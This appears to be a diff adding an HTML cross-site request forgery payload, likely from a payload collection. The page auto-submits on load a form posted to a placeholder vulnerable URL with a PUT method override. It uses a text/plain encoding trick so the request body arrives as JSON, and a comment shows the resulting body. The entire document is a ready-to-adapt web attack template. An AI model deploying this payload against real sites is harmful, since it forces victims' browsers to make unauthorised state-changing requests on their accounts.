@@ -1,0 +1,8 @@
+<body onload='document.forms[0].submit()'>
+<form action="https://<vulnerable-url?_method=PUT" method="POST" enctype="text/plain">
+  <input type="text" name='{"username":"blob","dummy":"' value='"}'>
+  <input type="submit" value="send">
+</form>
+
+<!---This results in a request body of:
+{"username":"blob", "dummy": "="} -->
